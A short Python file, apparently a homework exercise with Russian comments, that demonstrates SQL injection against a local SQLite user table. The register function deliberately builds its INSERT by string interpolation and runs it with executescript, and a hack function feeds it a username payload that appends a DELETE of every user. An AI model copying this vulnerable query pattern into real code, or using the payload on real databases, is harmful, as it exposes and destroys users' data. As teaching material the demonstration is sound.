import sqlite3


def register(username: str, password: str) -> None:
    with sqlite3.connect('../homework.db') as conn:
        cursor = conn.cursor()
        cursor.executescript(
            f"""
            INSERT INTO `table_users` (username, password)
            VALUES ('{username}', '{password}')  
            """
        )
        conn.commit()


def hack() -> None:
    # 1. Закрываем кавычку и скобку: ', ')
    # 2. Ставим точку с запятой для новой команды: ;
    # 3. Пишем саму атаку: DELETE FROM table_users;
    # 4. Пишем -- чтобы превратить остаток оригинального кода в комментарий
    username: str = "hacker', 'password'); DELETE FROM table_users; --"
    password: str = "unused"

    register(username, password)


if __name__ == '__main__':
    # Сначала регистрируем обычного пользователя (чтобы было что удалять)
    register('wignorbo', 'sjkadnkjasdnui31jkdwq')

    # Запускаем взлом
    hack()